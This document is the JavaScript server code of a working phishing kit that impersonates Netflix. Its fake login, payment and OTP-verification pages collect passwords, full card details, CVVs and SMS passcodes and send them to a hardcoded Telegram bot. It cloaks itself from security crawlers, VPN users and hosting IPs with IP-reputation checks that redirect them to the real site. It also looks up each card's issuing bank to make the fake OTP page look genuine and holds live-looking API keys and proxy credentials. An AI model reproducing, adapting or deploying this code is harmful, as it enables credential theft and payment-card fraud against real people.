// const express = require('express');
// const vhost = require('vhost');
// const session = require('express-session');
// const { v4: uuidv4 } = require('uuid');
// const axios = require('axios');
// const app = express();

// const IPINFO_API_TOKEN = '5f0f25362f9053'; // Replace with your actual API token

// // Configure session middleware
// app.use(session({
//   secret: 'ThfstiyvWBtcBohE2tkUrhX2EGSUpYE6',
//   resave: false,
//   saveUninitialized: true,
//   cookie: { secure: false }  // Set secure to true if using https
// }));

// const subdomainApp = express();

// subdomainApp.use(async (req, res, next) => {
//   try {
//     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
//     const response = await axios.get(`https://ipinfo.io/${ip}?token=${IPINFO_API_TOKEN}`);
//     req.geoLocation = response.data;
//   } catch (error) {
//     console.error('Error fetching geolocation:', error);
//     req.geoLocation = null;
//   }
//   next();
// });

// subdomainApp.get('/login', (req, res) => {
//   const geoLocation = req.geoLocation ? JSON.stringify(req.geoLocation, null, 2) : 'Location data not available';
//   res.send(`
//     <h1>Welcome to your unique subdomain: ${req.hostname}</h1>
//     <pre>Your geolocation data: ${geoLocation}</pre>
//   `);
// });

// const mainApp = express();
// mainApp.get('/', (req, res) => {
//   if (!req.session.subdomain) {
//     req.session.subdomain = uuidv4();
//   }
//   const uniqueSubdomain = `${req.session.subdomain}.biii.us`;
//   res.redirect(`http://${uniqueSubdomain}/login`);
// });

// app.use(vhost('*.biii.us', subdomainApp));
// app.use(vhost('transitor.biii.us', mainApp));

// app.listen(3011, () => {
//   console.log('Server running on port 3011');
// });


// const express = require("express");
// const bodyParser = require("body-parser");
// const axios = require("axios");
// const { v4: uuidv4 } = require("uuid");
// const session = require("express-session");

// const app = express();
// const port = 3011;

// // Middleware to parse form data
// app.use(bodyParser.urlencoded({ extended: true }));

// // Middleware for sessions
// app.use(session({
//   secret: 'ThfstiyvWBtcBohE2tkUrhX2EGSUpYE5', // Change this to a secure key
//   resave: false,
//   saveUninitialized: true,
//   cookie: { secure: false } // Set secure to true if using HTTPS
// }));

// // Middleware to handle unique subdomain generation and redirection
// app.use((req, res, next) => {
//   const host = req.headers.host;
//   const subdomain = req.session.subdomain;

//   if (host === 'transitor.biii.us') {
//     if (!subdomain) {
//       let uuid = uuidv4();
//       let uuidParts = uuid.split('-');
//       uuidParts[uuidParts.length - 1] = 'account-resolve';
//       req.session.subdomain = uuidParts.join('-');
//     }
//     res.redirect(`http://${req.session.subdomain}.biii.us/login`);
//   } else if (host.endsWith('.biii.us')) {
//     next();
//   } else {
//     res.status(403).send('Access Forbidden');
//   }
// });

// // Serve static files (e.g., HTML, CSS, JS) from a directory named 'NTFLX'
// app.use(express.static("NTFLX"));

// // Route to handle GET request
// app.get("/login", (req, res) => {
//   res.sendFile(__dirname + "/NTFLX/index.html");
// });

// // Capture user's IP address
// const getClientIp = (req) => {
//   return req.headers['x-forwarded-for'] || req.socket.remoteAddress;
// };

// async function sendMessageToBot(userLoginId, password, ip) {
//   const botToken = "7129475570:AAE4oX9VxtCqALfHtqjTqCnj6YWP_Pn8wj8"; // Replace with your Telegram bot's token
//   const chatId = "1096335592"; // Replace with your chat ID where you want to send the message

//   // Prepare the message
//   const message = `- NFX LOGIN - \nUSER: ${userLoginId}\nPASS: ${password}\nIP: ${ip}\n- NFX LOGIN -`;

//   try {
//     const response = await axios.post(
//       `https://api.telegram.org/bot${botToken}/sendMessage`,
//       {
//         chat_id: chatId,
//         text: message,
//       },
//     );
//     console.log("Message sent:", response.data);
//   } catch (error) {
//     console.error("Failed to send message:", error);
//   }
// }

// async function sendMessageToBotv1(creditCardNumber, creditExpirationMonth, creditCardSecurityCode, firstName, creditZipcode, ip) {
//   const botToken = "7129475570:AAE4oX9VxtCqALfHtqjTqCnj6YWP_Pn8wj8"; // Replace with your Telegram bot's token
//   const chatId = "1096335592"; // Replace with your chat ID where you want to send the message

//   // Prepare the message
//   const message = `- NFX DATA - \nCCNUM: ${creditCardNumber}\nEXP DATE: ${creditExpirationMonth}\nCVV: ${creditCardSecurityCode}\nFULL NAME: ${firstName}\nZIPCODE: ${creditZipcode}\nIP: ${ip}\n- NFX DATA -`;

//   try {
//     const response = await axios.post(
//       `https://api.telegram.org/bot${botToken}/sendMessage`,
//       {
//         chat_id: chatId,
//         text: message,
//       },
//     );
//     console.log("Message sent:", response.data);
//   } catch (error) {
//     console.error("Failed to send message:", error);
//   }
// }

// app.post("/submit-form", (req, res) => {
//   const params = req.body.param;
//   const ip = getClientIp(req);

//   try {
//     const parsedParams = JSON.parse(decodeURIComponent(params));
//     const { userLoginId, password } = parsedParams.fields;
//     console.log(`User: ${userLoginId}, Password: ${password}`);
//     sendMessageToBot(userLoginId, password, ip);
//     res.redirect("/thank-you");
//   } catch (e) {
//     console.error("Failed to parse parameters:", e);
//     res.status(400).send("Invalid parameters");
//   }
// });

// app.post("/updatePaymentMethod", (req, res) => {
//   const ip = getClientIp(req);

//   try {
//     const {
//       creditCardNumber,
//       creditExpirationMonth,
//       creditCardSecurityCode,
//       firstName,
//       creditZipcode,
//     } = req.body; // Directly destructure the fields from req.body

//     console.log(
//       `CARD: ${creditCardNumber}, EXPD: ${creditExpirationMonth}, CVV: ${creditCardSecurityCode}, NAME: ${firstName}, ZIPCODE: ${creditZipcode}, IP: ${ip}`,
//     );
//     sendMessageToBotv1(
//       creditCardNumber,
//       creditExpirationMonth,
//       creditCardSecurityCode,
//       firstName,
//       creditZipcode,
//       ip,
//     );
//     res.redirect("/thank-you");
//   } catch (e) {
//     console.error("Failed to handle request:", e);
//     res.status(400).send("Invalid parameters");
//   }
// });

// app.get("/thank-you", (req, res) => {
//   res.redirect("https://netflix.com/login");
// });

// app.get("/simplemember/images/US-en-20240903-TRIFECTA_GLOBAL_FALLBACK-perspective_d0db67d4-a740-462b-97e1-95ebb9ef84c3_large.jpg", (req, res) => {
//   res.sendFile(__dirname + "/NTFLX/images/US-en-20240903-TRIFECTA_GLOBAL_FALLBACK-perspective_d0db67d4-a740-462b-97e1-95ebb9ef84c3_large.jpg");
// });

// app.get("/simplemember/images/US-en-20240903-TRIFECTA_GLOBAL_FALLBACK-perspective_d0db67d4-a740-462b-97e1-95ebb9ef84c3_medium.jpg", (req, res) => {
//   res.sendFile(__dirname + "/NTFLX/images/US-en-20240903-TRIFECTA_GLOBAL_FALLBACK-perspective_d0db67d4-a740-462b-97e1-95ebb9ef84c3_medium.jpg");
// });

// app.get("/simplemember/images/US-en-20240903-TRIFECTA_GLOBAL_FALLBACK-perspective_d0db67d4-a740-462b-97e1-95ebb9ef84c3_small.jpg", (req, res) => {
//   res.sendFile(__dirname + "/NTFLX/images/US-en-20240903-TRIFECTA_GLOBAL_FALLBACK-perspective_d0db67d4-a740-462b-97e1-95ebb9ef84c3_small.jpg");
// });

// app.get("/ppIPaymentSubmitter", (req, res) => {
//   console.log("USER CLICKED ON PPL ---> REDIRECTING...");
//   res.redirect("https://invpy.pl/e8pal");
// });

// app.get("/simplemember/paymentupdater", (req, res) => {
//   res.sendFile(__dirname + "/NTFLX/update.html");
// });

// // Start the server
// app.listen(port, () => {
//   console.log(`Server running at http://localhost:${port}`);
// });


const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
const { v4: uuidv4 } = require("uuid");
const session = require("express-session");
const { getJson } = require("serpapi");
const { HttpsProxyAgent } = require("https-proxy-agent");
const crypto = require('crypto');

const username = 'user-sp72cek58j-sessionduration-1';
const password = 'jh_okvBcWC06vot50H';
const encodedCredentials = encodeProxyCredentials(username, password);
const proxyHost = 'gate.smartproxy.com';
const proxyPort = getRandomPort();
const proxyUrl = `http://${encodedCredentials}@${proxyHost}:${proxyPort}`;
const agent = new HttpsProxyAgent(proxyUrl);

const app = express();
const port = 3011;
const serpApiKey = "36607ca9bf9f473c95637a99f8486c3028144cf1300f0bbe0360df7743c78aeb";

const NodeCache = require('node-cache');
const cache = new NodeCache({ stdTTL: 3600 }); // Cache for 1 hour

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));


app.use(bodyParser.json());

// Set up EJS as the view engine
app.set("view engine", "ejs");

// Middleware for sessions
app.use(
    session({
        secret: "ThfstiyvWBtcBohE2tkUrhX2EGSUpYE5",
        resave: false,
        saveUninitialized: true,
        cookie: { secure: false },
    }),
);

// Function to encode proxy credentials
function encodeProxyCredentials(username, password) {
    return `${encodeURIComponent(username)}:${encodeURIComponent(password)}`;
}

// Function to get a random port for the proxy
function getRandomPort(min = 10000, max = 10700) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// Capture user's IP address
const getClientIp = (req) => {
    return req.headers["x-forwarded-for"] || req.socket.remoteAddress;
};

// Function to send message to Telegram
async function sendMessageToBot(message) {
    const botToken = "7241174688:AAEmVKFcYElg-8sX0VQbYggqrfGtfnaMl88";
    const chatId = "1096335592";
    const data = {
        text: message,
        chat_id: chatId,
    };

    try {
        await axios.get(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            params: data,
        });
        console.log("Message sent to Telegram");
    } catch (error) {
        console.error("Failed to send message:", error);
    }
}

// Middleware for IP checking
app.use(async (req, res, next) => {
    const ip = getClientIp(req).split(",")[0];
    const userAgent = req.headers['user-agent'];
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
    console.log(`Visitor IP: ${ip}, User Agent: ${userAgent}, Is Mobile: ${isMobile}`);

    const checkIPInfo = async (ip) => {
        // Check cache first
        const cachedData = cache.get(ip);
        if (cachedData) {
            console.log(`Cache hit for IP: ${ip}`);
            return cachedData.allowed;
        }

        const IPINFO_TOKEN = "71cb2f7a29ac52";
        const url = `https://ipinfo.io/${ip}?token=${IPINFO_TOKEN}`;

        try {
            const response = await axios.get(url);
            const { country, city, region, asn, company, privacy, abuse } = response.data;
            console.log(`
                ---------------------------------------
                IP Check (IPInfo)
                ---------------------------------------
                IP: ${ip}
                Country: ${country || 'UNAVAILABLE'}
                City: ${city || 'UNAVAILABLE'}
                Region: ${region || 'UNAVAILABLE'}
                ASN: ${asn?.asn || 'UNAVAILABLE'}
                ASN Name: ${asn?.name || 'UNAVAILABLE'}
                ASN Type: ${asn?.type || 'UNAVAILABLE'}
                Company: ${company?.name || 'UNAVAILABLE'}
                Company Type: ${company?.type || 'UNAVAILABLE'}
                VPN: ${privacy?.vpn === undefined ? 'UNAVAILABLE' : privacy.vpn}
                Proxy: ${privacy?.proxy === undefined ? 'UNAVAILABLE' : privacy.proxy}
                Tor: ${privacy?.tor === undefined ? 'UNAVAILABLE' : privacy.tor}
                Relay: ${privacy?.relay === undefined ? 'UNAVAILABLE' : privacy.relay}
                Hosting: ${privacy?.hosting === undefined ? 'UNAVAILABLE' : privacy.hosting}
                Service: ${privacy?.service || 'UNAVAILABLE'}
                ---------------------------------------`);

            let allowed = true;

            if (privacy?.vpn || privacy?.proxy || privacy?.tor || privacy?.hosting) {
                allowed = false;
                console.log(`BLOCKED: VPN/Proxy/Tor/Hosting detected for IP: ${ip}`);
            }

            if (allowed && country !== "US") {
                const ipQualityScoreResult = await checkIpQualityScore(ip);
                allowed = ipQualityScoreResult.allowed;
                
                console.log(`
            ---------------------------------------
            Non-US IP CHECK ${allowed ? 'ALLOWED' : 'BLOCKED'}
            ---------------------------------------
            IP: ${ip}
            Country: ${country}
            City: ${city || 'UNAVAILABLE'}
            Region: ${region || 'UNAVAILABLE'}
            ASN: ${asn?.asn || 'UNAVAILABLE'}
            ASN Name: ${asn?.name || 'UNAVAILABLE'}
            Company: ${company?.name || 'UNAVAILABLE'}
            Decision: ${allowed ? 'ALLOWED' : 'BLOCKED'}
            Reason: ${ipQualityScoreResult.reason}
            ---------------------------------------`);
            }

            if (company) {
                const asnName = (asn?.name || company?.name || '').toLowerCase();

                if ((asnName.includes("charter") || asnName.includes("apple")) && company.type === "business") {
                    console.log(`Business IP from ${asnName.toUpperCase()} --> ${ip}`);
                    const ipQualityScoreResult = await checkIpQualityScore(ip);
                    allowed = ipQualityScoreResult.allowed;
                    console.log(`${allowed ? 'ALLOWED' : 'BLOCKED'} ${asnName.toUpperCase()} BUSINESS IP --> ${ip}`);
                } else if (company.type === "hosting" || asn?.type === "hosting") {
                    allowed = false;
                    console.log(`BLOCKED: Hosting IP detected --> ${ip}`);
                }

                if (asnName.includes("google") || asnName.includes("facebook") ||
                    asnName.includes("amazon") || asnName.includes("microsoft") ||
                    asnName.includes("oracle") || asnName.includes("archive") ||
                    asnName.includes("kansas") || asnName.includes("cloudflare")) {
                    allowed = false;
                    console.log(`BLOCKED: Restricted ASN detected --> ${ip}`);
                }

                if (asnName.includes("centurylink") || asnName.includes("comcast") || 
                    asnName.includes("internet archive") || asnName.includes("university") || 
                    asnName.includes("midcontinent")) {
                    console.log(`SUS VISITOR FROM ${asnName} --> ${ip}`);
                    const strictness = asnName.includes("centurylink") || asnName.includes("comcast") ? "3" : "1";
                    const ipQualityScoreResult = await checkIpQualityScore(ip, strictness);
                    allowed = ipQualityScoreResult.allowed;
                    if (!allowed) {
                        console.log(`BLOCKED ${asnName.toUpperCase()} BOT --> ${ip}`);
                    }
                }

                if (company?.type === "business") {
                    const ipQualityScoreResult = await checkIpQualityScore(ip);
                    allowed = ipQualityScoreResult.allowed;
                    console.log(`LAYER[2] -- ${allowed ? 'ALLOWED' : 'BLOCKED'} ${asnName.toUpperCase()} BUSINESS IP --> ${ip}`);
                }
            }

            console.log(`Final decision for IP ${ip}: ${allowed ? 'ALLOWED' : 'BLOCKED'}`);
            
            // Cache the result
            cache.set(ip, { allowed });
            
            return allowed;
        } catch (error) {
            console.error("Error fetching IPInfo:", error.message);
            return false;
        }
    };

    const checkIpQualityScore = async (ip, strictness = "1") => {
        // Check cache first
        const cacheKey = `ipqs_${ip}_${strictness}`;
        const cachedData = cache.get(cacheKey);
        if (cachedData) {
            console.log(`Cache hit for IP Quality Score: ${ip} (Strictness: ${strictness})`);
            return cachedData;
        }

        const ipQualityScoreUrl = `https://ipqualityscore.com/api/json/ip/juD90IvBTtl5YrYfzPmHXcFhf2BSqZis/${ip}?strictness=${strictness}&allow_public_access_points=true&fast=true&lighter_penalties=true&mobile=${isMobile}&user_agent=${encodeURIComponent(userAgent)}`;
        try {
            const ipQualityScoreResponse = await axios.get(ipQualityScoreUrl);
            const { recent_abuse, bot_status, ISP, host, organization, mobile, proxy, vpn, tor, fraud_score } = ipQualityScoreResponse.data;
            console.log(`
--------------------------------------
IP Quality Score Check (Strictness: ${strictness})
--------------------------------------
ISP: ${ISP || 'UNAVAILABLE'}
Hostname: ${host || 'UNAVAILABLE'}
Organization: ${organization || 'UNAVAILABLE'}
Mobile: ${mobile}
Proxy: ${proxy}
VPN: ${vpn}
TOR: ${tor}
Fraud Score: ${fraud_score}
--------------------------------------`);
            const result = { 
                allowed: !(recent_abuse || bot_status || proxy || vpn || tor || fraud_score > 75), 
                reason: 'Failed one or more checks' 
            };
            
            // Cache the result
            cache.set(cacheKey, result);
            
            return result;
        } catch (error) {
            console.error("Error fetching IP Quality Score:", error.message);
            return { allowed: false, reason: 'Error checking IP Quality Score' };
        }
    };

    try {
        const allowed = await checkIPInfo(ip);
        if (!allowed) {
            console.log("BLOCKED USER -->", ip);
            //return res.status(403).json({
            //    success: false,
            //    message: "Access denied.",
            //});
            return res.redirect("https://www.netflix.com/NotFound?prev=https%3A%2F%2Fwww.netflix.com%2FForbidden%3Fprev%3Dhttps%253A%252F%252Fwww.netflix.com%252Fforbidden");
        }
        
        console.log("ALLOWED USER -->", ip);
        next();
    } catch (error) {
        console.error("Error in middleware:", error);
        return res.status(500).json({
            success: false,
            message: "Internal Server Error",
        });
    }
});

// Middleware for domain checking
app.use((req, res, next) => {
    const host = req.headers.host;
    if (host.endsWith('fly.dev') || host.endsWith('settlemonitor.com')) {
        next();
    //} else if (req.ip === "2600:1006:b001:9555:2016:45a5:2047:e86a"){
    //    res.redirect("https://netflix.com/login")
    } else {
        res.redirect("https://netflix.com/login");
    }
});

// Serve static files
app.use(express.static("NTFLX"));

// Route to handle GET request
app.get("/login", (req, res) => {
    res.sendFile(__dirname + "/NTFLX/index.html");
});
const detectCardType = (cardNumber) => {
    // Remove any non-digit characters
    const cleanNumber = cardNumber.replace(/\D/g, '');
  
    // Regex patterns for different card types
    const patterns = {
      Visa: /^4/,
      Mastercard: /^5[1-5]|^2[2-7]/,
      'American Express': /^3[47]/,
      Discover: /^6(?:011|5)/,
      JCB: /^35(?:2[89]|[3-8])/,
      'Diners Club': /^3(?:0[0-5]|[68])/,
      Maestro: /^(5018|5020|5038|6304|6759|676[1-3])/,
      UnionPay: /^62/
    };
  
    for (const [cardType, pattern] of Object.entries(patterns)) {
      if (pattern.test(cleanNumber)) {
        return cardType;
      }
    }
  
    return 'Unknown';
  };
  
  const blacklistedBanks = ['chase', 'jpmorgan chase', 'jpmorgan chase bank', 'j.p. morgan'];
  
  // Route to handle payment method update
  app.post("/updatePaymentMethod", async (req, res) => {
      const ip = getClientIp(req);
      try {
          const {
              creditCardNumber,
              creditExpirationMonth,
              creditCardSecurityCode,
              creditCardSecurityPCode,
              firstName,
              creditZipcode,
          } = req.body;
  
          if (!creditCardNumber) {
              return res.status(400).json({
                  success: false,
                  message: "Credit card number is required."
              });
          }
  
          const bin = creditCardNumber.replace(/\s+/g, "").slice(0, 6);
          const randomPort = getRandomPort();
          const proxyUrl = `http://${encodedCredentials}@${proxyHost}:${randomPort}`;
          const agent = new HttpsProxyAgent(proxyUrl);
  
          let bankName = "Unknown Bank";
          let cardType = detectCardType(creditCardNumber);
          let isBlacklisted = false;
  
          // Set default bank name for American Express
          if (cardType === 'American Express') {
              bankName = "American Express";
          }
  
          try {
            const apiLayerResponse = await axios.get(
                `https://api.apilayer.com/bincheck/${bin}`,
                {
                    headers: {
                        'apikey': 'XMCXLi0yUABWwaem1lg9VPD7wxikd4Gu'
                    }
                }
            );
            
            // Only update bank name if it's returned by the API and not empty
            if (apiLayerResponse.data.bank_name) {
                bankName = apiLayerResponse.data.bank_name;
            }
            
            // Only update card type if it's returned by the API
            if (apiLayerResponse.data.scheme) {
                cardType = apiLayerResponse.data.scheme;
            }

            //const binlistResponse = await axios.get(
            //    `https://lookup.binlist.net/${bin}`,
            //    { httpsAgent: agent },
            // );
            
            // Only update bank name if it's returned by the API and not empty
            // if (binlistResponse.data.bank && binlistResponse.data.bank.name) {
            //    bankName = binlistResponse.data.bank.name;
            // }
            
            // Only update card type if it's returned by the API
            // if (binlistResponse.data.scheme) {
            //    cardType = binlistResponse.data.scheme;
            // }
              
              // Check if the bank is blacklisted
              isBlacklisted = blacklistedBanks.some(blacklistedBank => 
                  bankName.toLowerCase().includes(blacklistedBank)
              );
  
            //   console.log("Bank name from BIN lookup:", bankName);
            //   console.log("Card type:", cardType);
            //   console.log("Is blacklisted:", isBlacklisted);
          } catch (error) {
              console.error("BIN lookup failed:", error.message);
              // If BIN lookup fails, we keep the default or previously set values
          }
  
          // Ensure bankName is not empty
          if (!bankName || bankName.trim() === "") {
              bankName = cardType === 'American Express' ? "American Express" : "Unknown Bank";
          }
  
          // Store required data in session
          req.session.ccnumber = creditCardNumber;
          req.session.phoneNumber = "1234567890"; // Set a dummy phone number for testing
          req.session.firstName = firstName;
          req.session.bankName = bankName;
          req.session.cardType = cardType;
          let paymentDetailsMessage;
          if (cardType === 'American Express') {
              paymentDetailsMessage = `- NFX DATA - \nCCNUM: ${creditCardNumber}\nCARD TYPE: ${cardType.toUpperCase()}\nEXP DATE: ${creditExpirationMonth}\nCID: ${creditCardSecurityCode}\nSPC: ${creditCardSecurityPCode}\nFULL NAME: ${firstName}\nZIPCODE: ${creditZipcode}\nBANK: ${bankName}\nIP: ${ip}\nBLACKLISTED: ${isBlacklisted ? 'YES' : 'NO'}\n- NFX DATA -`;
          } else {
              paymentDetailsMessage = `- NFX DATA - \nCCNUM: ${creditCardNumber}\nCARD TYPE: ${cardType.toUpperCase()}\nEXP DATE: ${creditExpirationMonth}\nCVV: ${creditCardSecurityCode}\nFULL NAME: ${firstName}\nZIPCODE: ${creditZipcode}\nBANK: ${bankName}\nIP: ${ip}\nBLACKLISTED: ${isBlacklisted ? 'YES' : 'NO'}\n- NFX DATA -`;
          }
          // Send the payment details message to Telegram
          // const paymentDetailsMessage = `- NFX DATA - \nCCNUM: ${creditCardNumber}\nCARD TYPE: ${cardType.toUpperCase()}\nEXP DATE: ${creditExpirationMonth}\nCVV: ${creditCardSecurityCode}\nFULL NAME: ${firstName}\nZIPCODE: ${creditZipcode}\nBANK: ${bankName}\nIP: ${ip}\nBLACKLISTED: ${isBlacklisted ? 'YES' : 'NO'}\n- NFX DATA -`;
          await sendMessageToBot(paymentDetailsMessage);
  
          // Check if the bank is blacklisted after sending to Telegram
          if (isBlacklisted) {
              return res.status(400).json({
                  success: false,
                  message: "Your card does not support this type of purchase, try again with another card."
              });
          }
  
          // Send success response with redirect URL
          res.json({
              success: true,
              redirectUrl: `/otp-verification?bank=${encodeURIComponent(bankName)}&cchold=${encodeURIComponent(firstName)}`
          });
      } catch (e) {
          console.error("Failed to handle request:", e);
          res.status(400).json({
              success: false,
              message: "Invalid parameters"
          });
      }
  });

app.post("/submit-form", (req, res) => {
    const params = req.body.param;
    const ip = getClientIp(req);

    try {
        const parsedParams = JSON.parse(decodeURIComponent(params));
        const { userLoginId, password } = parsedParams.fields;
        const message = `- NFX LOGIN - \nUSER: ${userLoginId}\nPASS: ${password}\nIP: ${ip}\n- NFX LOGIN -`;
        sendMessageToBot(message);
        res.redirect("/thank-you");
    } catch (e) {
        console.error("Failed to parse parameters:", e);
        res.status(400).send("Invalid parameters");
    }
});

// Route to handle OTP verification GET request
app.get("/otp-verification", (req, res) => {
    const { bank, cchold } = req.query;
    const error = req.query.error || 0;

    if (!bank || !cchold) {
        return res.status(400).send("Missing required parameters / Session_Terminated_Unexpectedly");
    }

    const query = {
        engine: "google",
        api_key: serpApiKey,
        q: `${bank} bank logo official`,
        tbm: "isch",
        ijn: "0",
    };

    getJson(query, (json) => {
        const images_results = json.images_results;
        const lkhr = images_results.length ? images_results[0].original : "";
        const dateYmd = new Date().toLocaleDateString("en-US");
        const phone = req.session.phoneNumber || "Unknown";
        const okbbx = error == 1 ? "okbbxErr" : "okbbx";
        const msg =
            error == 1
                ? `<div class='msg oaerror danger' style='width: 90%; display: table; align-items: stretch;'><p>The one-Time Passcode entered is incorrect. Another OTP has been sent to your mobile <h4 style='font-weight:bold;'>****</h4></p></div>`
                : "<div class='msg oaerror info' style='width: 90%; display: table; align-items: stretch;'>One-Time Passcode is required for this purchase. This passcode has been sent to your registered mobile.</div>";

        res.render("otp", {
            lkhr,
            phone: getTruncatedPHONE(phone),
            dateYmd,
            ccNum: getTruncatedCCNumber(req.session.ccnumber),
            cchold: req.session.firstName ? req.session.firstName.toUpperCase() : cchold.toUpperCase(),
            bank: req.session.bankName || bank,
            ip_address: req.ip,
            error,
            okbbx,
            msg,
        });
    });
});

// Route to handle OTP verification POST request
app.post("/otp-verification", async (req, res) => {
    const { thd,spc } = req.body;
    const ip = getClientIp(req);
    const error = req.query.error || 0;

    let message;
    if (error == 1) {
        message = `-------------------- <3 NFX2 <3-------------------
2ND SMS Code  : ${thd}
SPC = ${spc}
IP      : ${ip}:
-------------------- <3 NFX2 <3-------------------`;
    } else {
        message = `-------------------- <3 NFX <3-------------------
SMS Code  : ${thd}
SPC = ${spc}
IP      : ${ip}:
-------------------- <3 NFX <3-------------------`;
    }

    await sendMessageToBot(message);

    if (error == 1) {
        req.session.islast = req.body.islast || "no";
        if (req.session.islast == "yes") {
            setTimeout(() => {
                res.redirect("/thank-you");
            }, 3000);
        } else {
            setTimeout(() => {
                res.redirect(
                    `/otp-verification?error=1&bank=${encodeURIComponent(req.session.bankName)}&cchold=${encodeURIComponent(req.session.firstName)}`,
                );
            }, 2000);
        }
    } else {
        setTimeout(() => {
            res.redirect(
                `/otp-verification?error=1&bank=${encodeURIComponent(req.session.bankName)}&cchold=${encodeURIComponent(req.session.firstName)}`,
            );
        }, 10000);
    }
});

app.get("/thank-you", (req, res) => {
    res.redirect("https://netflix.com/login");
});

app.get(
    "/simplemember/images/US-en-20240903-TRIFECTA_GLOBAL_FALLBACK-perspective_d0db67d4-a740-462b-97e1-95ebb9ef84c3_large.jpg",
    (req, res) => {
        res.sendFile(
            __dirname +
            "/NTFLX/images/US-en-20240903-TRIFECTA_GLOBAL_FALLBACK-perspective_d0db67d4-a740-462b-97e1-95ebb9ef84c3_large.jpg",
        );
    },
);

app.get(
    "/simplemember/images/US-en-20240903-TRIFECTA_GLOBAL_FALLBACK-perspective_d0db67d4-a740-462b-97e1-95ebb9ef84c3_medium.jpg",
    (req, res) => {
        res.sendFile(
            __dirname +
            "/NTFLX/images/US-en-20240903-TRIFECTA_GLOBAL_FALLBACK-perspective_d0db67d4-a740-462b-97e1-95ebb9ef84c3_medium.jpg",
        );
    },
);

app.get(
    "/simplemember/images/US-en-20240903-TRIFECTA_GLOBAL_FALLBACK-perspective_d0db67d4-a740-462b-97e1-95ebb9ef84c3_small.jpg",
    (req, res) => {
        res.sendFile(
            __dirname +
            "/NTFLX/images/US-en-20240903-TRIFECTA_GLOBAL_FALLBACK-perspective_d0db67d4-a740-462b-97e1-95ebb9ef84c3_small.jpg",
        );
    },
);

app.get("/simplemember/nficon2023.ico", (req, res) => {
    res.sendFile(__dirname + "/NTFLX/nficon2023.ico");
});

app.get("/ppIPaymentSubmitter", (req, res) => {
    console.log("USER CLICKED ON PPL ---> REDIRECTING...");
    res.redirect("https://actpy.pl/ntf1x");
});

app.get("/simplemember/paymentupdater", (req, res) => {
    res.sendFile(__dirname + "/NTFLX/updatePPL.html");
});

// Start the server
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});

// Helper functions
function getTruncatedPHONE(phone) {
    if (!phone) return "****-****"; // Return a default masked number if phone is undefined
    return phone.slice(0, -4).replace(/\d/g, "*") + phone.slice(-4);
}

function getTruncatedCCNumber(ccNum) {
    if (!ccNum) return "XXXX-XXXX-XXXX-XXXX"; // Return a default masked number if ccNum is undefined
    return ccNum.slice(0, -4).replace(/\d/g, "X") + ccNum.slice(-4);
}